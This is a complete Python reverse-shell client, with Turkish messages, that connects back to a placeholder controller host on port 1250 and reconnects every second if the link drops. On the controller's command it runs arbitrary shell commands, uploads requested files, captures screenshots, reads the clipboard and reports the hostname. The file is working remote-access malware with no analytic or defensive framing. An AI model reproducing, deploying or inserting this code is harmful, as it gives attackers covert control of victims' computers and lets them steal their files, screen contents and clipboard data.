import socket
import os
import subprocess
import time
import pyautogui
import pyperclip

host = "<IP>"
port = 1250
while 1:
    try:
        serverSocket = socket.socket()
        serverSocket.connect((host, port))
        while 1:
            data = serverSocket.recv(1024)
            
            if data.decode("utf-8") == "cmd":
                while 1:
                    data = serverSocket.recv(1024)
                    if data[:2].decode("utf-8") == "cd":
                        try:
                            os.chdir(data[3:].decode("utf-8"))
                            serverSocket.send(os.getcwd().encode("utf-8"))
                        except FileNotFoundError:
                            serverSocket.send("Dosya bulunamadı.".encode("utf-8"))
                    elif data.decode("utf-8") == "quit":
                        break
                        
                    else:
                        if len(data) > 0:
                            # stdin: request command, stdout: response command, stderr: invalid command
                            command = subprocess.Popen(data.decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            response_byte = command.stdout.read() + command.stderr.read()
                            response_str = str(response_byte, encoding= "cp857")
                            location = os.getcwd()
                            serverSocket.send(str.encode(response_str + "\n" + location, encoding= "utf-8"))
                        else:
                            serverSocket.send(b" ")
                            
            elif data.decode("utf-8") == "dt":
                path = serverSocket.recv(1024).decode("utf-8")
                size = str(os.path.getsize(path))
                serverSocket.send(size.encode("utf-8"))
                serverSocket.recv(1024)
                
                with open(path, "rb") as file: # read byte
                    serverSocket.sendall(file.read())
           
            elif data.decode("utf-8") == "ss":
                try:
                    username = os.getlogin()
                    path = "C:/Users/"+username+"/Appdata/Local/Temp/ss.png"
                    pyautogui.screenshot(path)
                    serverSocket.send(path.encode("utf-8"))
                    
                except Exception as e:
                    print("SS Hata: "+e)
            elif data.decode("utf-8") == "clipboard":
               try:
                    data = pyperclip.waitForPaste(3)
                    serverSocket.send(data.encode("utf-8"))
                    
               except Exception as e:
                   serverSocket.send("Panoda bir dosya bulunuyor.".encode("utf-8"))
                    
            elif data.decode("utf-8") == "pcname":
                serverSocket.send(socket.gethostname().encode("utf-8"))
            
            else:
                print("istek geldi : "+data.decode("utf-8"))
                serverSocket.send(b" ")

    except Exception as e:
        time.sleep(1)
        #print(e)

